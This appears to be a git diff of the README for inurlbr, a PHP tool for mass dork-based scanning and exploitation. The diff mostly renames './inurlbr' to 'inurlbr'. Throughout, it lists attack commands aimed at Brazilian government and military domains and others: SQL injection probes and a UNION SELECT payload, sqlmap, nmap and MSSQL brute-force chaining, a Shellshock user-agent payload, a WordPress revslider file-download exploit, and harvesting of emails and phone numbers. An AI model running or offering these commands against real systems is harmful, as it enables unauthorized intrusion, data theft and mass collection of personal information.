@@ -67,22 +67,25 @@ The inurlbr works with [php](http://php.net/downloads.php) version **7.x**  linu
 ## Giving permission to script execution
 ```properties
 $chmod +x inurlbr
-Run: ./inurlbr
+```
+## Create a symbolic link
+```properties
+ln -s $PWD/inurlbr /usr/bin/inurlbr
 ```
 
 ## Usage
 To get a list of basic options and switches use:
 ```properties
-./inurlbr -h
+inurlbr -h
 ```
 To get a list of all options and switches use:
 ```properties
-./inurlbr --help 
+inurlbr --help 
 ```
 
 command examples:
 ```properties
-./inurlbr --info
+inurlbr --info
 ```
 
 ## Setting your token ipinfo
@@ -105,65 +108,65 @@ You can register more filter values that dirty your results
 
 ## Commands
 ```properties
-./inurlbr --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"  
+inurlbr --dork 'inurl:php?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"  
    
-./inurlbr --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;" 
+inurlbr --dork 'inurl:aspx?id=' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;" 
    
-./inurlbr --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
+inurlbr --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
    
-./inurlbr --dork 'index of wp-content/uploads' -s save.txt -q 1,6,2,4 -t 2 --exploit-get '?' -a 'Index of /wp-content/uploads'
+inurlbr --dork 'index of wp-content/uploads' -s save.txt -q 1,6,2,4 -t 2 --exploit-get '?' -a 'Index of /wp-content/uploads'
    
-./inurlbr --dork 'site:.mil.br intext:(confidencial) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'confidencial'
+inurlbr --dork 'site:.mil.br intext:(confidencial) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'confidencial'
    
-./inurlbr --dork 'site:.mil.br intext:(secreto) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'secreto'        
+inurlbr --dork 'site:.mil.br intext:(secreto) ext:pdf' -s save.txt -q 1,6 -t 2 --exploit-get '?' -a 'secreto'        
   
-./inurlbr --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
+inurlbr --dork 'site:br inurl:aspx (id|new)' -s save.txt -q 1,6 -t 1 --exploit-get "?´'%270x27;"
    
-./inurlbr --dork '.new.php?new id' -s save.txt -q 1,6,7,2,3 -t 1 --exploit-get '+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' -a '::EXPLOIT-SUCESS::'
+inurlbr --dork '.new.php?new id' -s save.txt -q 1,6,7,2,3 -t 1 --exploit-get '+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' -a '::EXPLOIT-SUCESS::'
   
-./inurlbr --dork 'new.php?id=' -s teste.txt  --exploit-get ?´0x27  --command-vul 'nmap sV -p 22,80,21 _TARGET_'
+inurlbr --dork 'new.php?id=' -s teste.txt  --exploit-get ?´0x27  --command-vul 'nmap sV -p 22,80,21 _TARGET_'
    
-./inurlbr --dork 'site:pt inurl:aspx (id|q)' -s bruteforce.txt --exploit-get ?´0x27 --command-vul 'msfcli auxiliary/scanner/mssql/mssql_login RHOST=_TARGETIP_ MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'
+inurlbr --dork 'site:pt inurl:aspx (id|q)' -s bruteforce.txt --exploit-get ?´0x27 --command-vul 'msfcli auxiliary/scanner/mssql/mssql_login RHOST=_TARGETIP_ MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'
   
-./inurlbr --dork 'site:br inurl:id & inurl:php' -s get.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap/sqlmap.py -u "_TARGETFULL_" --dbs'
+inurlbr --dork 'site:br inurl:id & inurl:php' -s get.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap/sqlmap.py -u "_TARGETFULL_" --dbs'
   
-./inurlbr --dork 'inurl:index.php?id=' -q 1,2,10 --exploit-get "'?´0x27'" -s report.txt --command-vul 'nmap -Pn -p 1-8080 --script http-enum --open _TARGET_'
+inurlbr --dork 'inurl:index.php?id=' -q 1,2,10 --exploit-get "'?´0x27'" -s report.txt --command-vul 'nmap -Pn -p 1-8080 --script http-enum --open _TARGET_'
  
-./inurlbr --dork 'site:.gov.br email' -s reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
+inurlbr --dork 'site:.gov.br email' -s reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
   
-./inurlbr --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s emails.txt -m
+inurlbr --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s emails.txt -m
   
-./inurlbr --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s urls.txt -u
+inurlbr --dork 'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' -s urls.txt -u
  
-./inurlbr --dork 'site:gov.bo' -s govs.txt --exploit-all-id  1,2,6  
+inurlbr --dork 'site:gov.bo' -s govs.txt --exploit-all-id  1,2,6  
  
-./inurlbr --dork 'site:.uk' -s uk.txt --user-agent  'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' 
+inurlbr --dork 'site:.uk' -s uk.txt --user-agent  'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' 
  
-./inurlbr --dork-file 'dorksSqli.txt' -s govs.txt --exploit-all-id  1,2,6 
+inurlbr --dork-file 'dorksSqli.txt' -s govs.txt --exploit-all-id  1,2,6 
  
-./inurlbr --dork-file 'dorksSqli.txt' -s sqli.txt --exploit-all-id  1,2,6  --irc 'irc.rizon.net#inurlbrasil'   
+inurlbr --dork-file 'dorksSqli.txt' -s sqli.txt --exploit-all-id  1,2,6  --irc 'irc.rizon.net#inurlbrasil'   
   
-./inurlbr --dork 'inurl:"cgi-bin/login.cgi"' -s cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_'  
+inurlbr --dork 'inurl:"cgi-bin/login.cgi"' -s cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_'  
  
-./inurlbr --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4
+inurlbr --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4
   
-./inurlbr --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?´'%270x27;"
+inurlbr --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?´'%270x27;"
   
-./inurlbr --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?pass=1234" -a '<title>hello! admin</title>'
+inurlbr --target 'http://target.com.br' -o cancat_file_urls_find.txt -s output.txt -t 4 --exploit-get "?pass=1234" -a '<title>hello! admin</title>'
   
-./inurlbr --target 'http://target.com.br' -o cancat_file_urls_find_valid_cod-200.txt -s output.txt -t 5
+inurlbr --target 'http://target.com.br' -o cancat_file_urls_find_valid_cod-200.txt -s output.txt -t 5
   
-./inurlbr --range '200.20.10.1,200.20.10.255' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
+inurlbr --range '200.20.10.1,200.20.10.255' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
  
-./inurlbr --range-rad '1500' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
+inurlbr --range-rad '1500' -s output.txt --command-all 'php roteador.php _TARGETIP_'  
  
-./inurlbr --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8  
+inurlbr --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8  
  
-./inurlbr --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8   --pr
+inurlbr --dork-rad '20' -s output.txt --exploit-get "?´'%270x27;" -q 1,2,6,4,5,9,7,8   --pr
  
-./inurlbr --dork-file 'dorksCGI.txt' -s output.txt -q 1,2,6,4,5,9,7,8   --pr --shellshock
+inurlbr --dork-file 'dorksCGI.txt' -s output.txt -q 1,2,6,4,5,9,7,8   --pr --shellshock
  
-./inurlbr --dork-file 'dorks_Wordpress_revslider.txt' -s output.txt -q 1,2,6,4,5,9,7,8  --sub-file 'xpls_Arbitrary_File_Download.txt'  
+inurlbr --dork-file 'dorks_Wordpress_revslider.txt' -s output.txt -q 1,2,6,4,5,9,7,8  --sub-file 'xpls_Arbitrary_File_Download.txt'  
 ```
 
 
@@ -449,7 +452,7 @@ You can register more filter values that dirty your results
       Usage-exploit / SHELLSHOCK:   
       --user-agent '() { foo;};echo; /bin/bash -c "expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;"'
       Complete command:    
-      ./inurlbr --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
+      inurlbr --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
  
  --sall Saves all urls found by the scanner.
      Example: --sall {file}
@@ -615,57 +618,57 @@ You can register more filter values that dirty your results
 ![Screenshot](https://1.bp.blogspot.com/-WswyqXamP44/YGYofFT6siI/AAAAAAAAAso/ea-3nf6OEqQxMw-dpEuIKedzwT7B5d0rwCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-08-08.png)
 ### Email extraction
 ```bash
-./inurlbr  --dork '"com.br" contato  .xlsx' -m  -s emails.txt -q all
+inurlbr  --dork '"com.br" contato  .xlsx' -m  -s emails.txt -q all
 ```
 ![Screenshot](https://1.bp.blogspot.com/-K_7F9nngSDk/YGYn30s1SHI/AAAAAAAAAsg/4k9NrPpBrognZ6kjx0WqeZo591X3nCydwCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-01-03.png)
 
 ### External Command
 ```bash
-./inurlbr --dork '"com.br" index.php?id id' -s sqlmap.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap-dev/sqlmap.py -u "_TARGETFULL_" --dbs --batch --threads 10 -p id --random-agent'
+inurlbr --dork '"com.br" index.php?id id' -s sqlmap.txt --exploit-get "?´'%270x27;" --command-vul 'python ../sqlmap-dev/sqlmap.py -u "_TARGETFULL_" --dbs --batch --threads 10 -p id --random-agent'
 ```
 ![Screenshot](https://1.bp.blogspot.com/-dz8I8p2Aies/YGYr_yZ8x3I/AAAAAAAAAsw/cHq4KS8E6AwK7l66EsykqFgvWyXjtJqVACLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B17-18-39.png)
 
 ### Filter Result Value
 ```bash
-./inurlbr --dork '"com.br/wp-login.php"' -t 2  -a 'wp-login.php?action=lostpassword' -s filter_string.txt
+inurlbr --dork '"com.br/wp-login.php"' -t 2  -a 'wp-login.php?action=lostpassword' -s filter_string.txt
 ```
 ![Screenshot](https://1.bp.blogspot.com/-vzZbwf_KobA/YGY8KQJCJwI/AAAAAAAAAs4/6jt1cse_4Goz3pfNeB1un4tmhRkKfnkVgCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B18-31-58.png)
 
 ### Simple fuzz 
 ```bash
-./inurlbr --target 'https://YOUR_TARGET' -o fuzz.txt -s php_result.txt -t 2 -a 'phpMyAdmin 2.11.4'
+inurlbr --target 'https://YOUR_TARGET' -o fuzz.txt -s php_result.txt -t 2 -a 'phpMyAdmin 2.11.4'
 ```
 ![Screenshot](https://1.bp.blogspot.com/-bajxhdjFMbI/YGZaj1Cj9MI/AAAAAAAAAtA/Z3trH2lq3mEPcwtfoekdS7OanLfDrcZhQCLcBGAsYHQ/s1214/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B20-41-09.png)
 
 ### Parallel terminal ( popup )
 ```bash
-./inurlbr --target 'https://YOUR_TARGET' -o fuzz.txt -s popup_result.txt -t 2 -a 'phpMyAdmin 2.11.4' --command-vul "nmap -sV -v  _TARGET_ ;"  --popup 
+inurlbr --target 'https://YOUR_TARGET' -o fuzz.txt -s popup_result.txt -t 2 -a 'phpMyAdmin 2.11.4' --command-vul "nmap -sV -v  _TARGET_ ;"  --popup 
 ```
 ![Screenshot](https://1.bp.blogspot.com/-AFOmlAmYzUg/YGZgaNOY2II/AAAAAAAAAtI/twy2icF7kTo6N2YPKzOQojptIZYTCmbywCLcBGAsYHQ/s2057/Captura%2Bde%2Btela%2Bde%2B2021-04-01%2B21-05-40.png)
 
 
 ### Extract urls using archive.org
 ```bash
-./inurlbr  -o 'defense.gov.txt' --ua -s 'defense.gov.out'
+inurlbr  -o 'defense.gov.txt' --ua -s 'defense.gov.out'
 ```
 ![Screenshot](https://1.bp.blogspot.com/-4RwLa0MyUqI/YG_KIpr1eII/AAAAAAAAAuo/iNwH0MMY-7I9AGDc9Z9OkmBMZ5ZNAEWwgCLcBGAsYHQ/s1104/Captura%2Bde%2Btela%2Bde%2B2021-04-09%2B00-15-33.png)
 
 ### Extract urls using Robots.txt file
 ```bash
-./inurlbr --dork 'jus.br' -s 'urls-extracted-robots.txt' -q 1 --robots
+inurlbr --dork 'jus.br' -s 'urls-extracted-robots.txt' -q 1 --robots
 ```
 ![Screenshot](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqzMUV1UC3G6Rojs3F9D0JvV70XWSQDT71f0iv8kB21ywKdSbAd9dtFksvda5nqv6sSJQZ2ca8Yw32ivzcOpL2ziqloeel2gkWoLArSQ6eCNtY5WvuT8RctCtwtzHKqW5I69vRoUgWPo80N_16zyTb-8IImxIfUHeGMUSKjxGYprtrfSJuv1Uo3z34wGo/s1452/Captura%20de%20tela%20de%202024-09-13%2007-33-01.png)
 
 
 ### Extract values using regex
 ```bash
-./inurlbr --dork 'contato telefone' -s 'reg.txt' -q 1 --regexp-filter '([0-9]{2}[6789][0-9]{3,4}[0-9]{4})'
+inurlbr --dork 'contato telefone' -s 'reg.txt' -q 1 --regexp-filter '([0-9]{2}[6789][0-9]{3,4}[0-9]{4})'
 ```
 ![Screenshot](https://1.bp.blogspot.com/-CxspmhIyEh0/YG_LQKM8O1I/AAAAAAAAAu4/qgZ8dpiku1I9GGhQX-TyoPEQUdSNx2VRACLcBGAsYHQ/s1184/Captura%2Bde%2Btela%2Bde%2B2021-04-09%2B00-33-35.png)
 
 ### Validate values using regex
 ```bash
-./inurlbr --dork 'contato telefone' -s 'reg.txt' -q 1 --regexp '([0-9]{2}[6789][0-9]{3,4}[0-9]{4})'
+inurlbr --dork 'contato telefone' -s 'reg.txt' -q 1 --regexp '([0-9]{2}[6789][0-9]{3,4}[0-9]{4})'
 ```
 ![Screenshot](https://1.bp.blogspot.com/-9YocowQy_-A/YG_Jodfsz6I/AAAAAAAAAug/D03Wz6GsFQsne0uozgA-Z_Kz8xNBrjB7gCLcBGAsYHQ/s1184/Captura%2Bde%2Btela%2Bde%2B2021-04-09%2B00-24-45.png)
 
